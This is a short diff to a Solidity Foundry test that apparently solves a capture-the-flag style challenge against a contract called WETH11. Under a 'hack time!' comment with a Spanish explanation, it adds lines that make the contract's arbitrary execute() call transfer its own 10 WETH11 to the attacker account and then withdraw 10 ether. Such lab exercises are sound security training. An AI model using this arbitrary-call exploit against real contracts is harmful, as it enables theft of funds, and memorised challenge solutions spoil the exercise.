@@ -33,6 +33,10 @@ contract Weth11Test is Test {
         vm.startPrank(bob);
 
         // hack time!
+        // Hacemos que el contrato nos transfiera los 10 WETH11 y a continuación retiramos los 10 ether
+        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", bob, 10 ether);
+        weth.execute(address(weth), 0, data);
+        weth.withdraw(10 ether);
 
         vm.stopPrank();
 
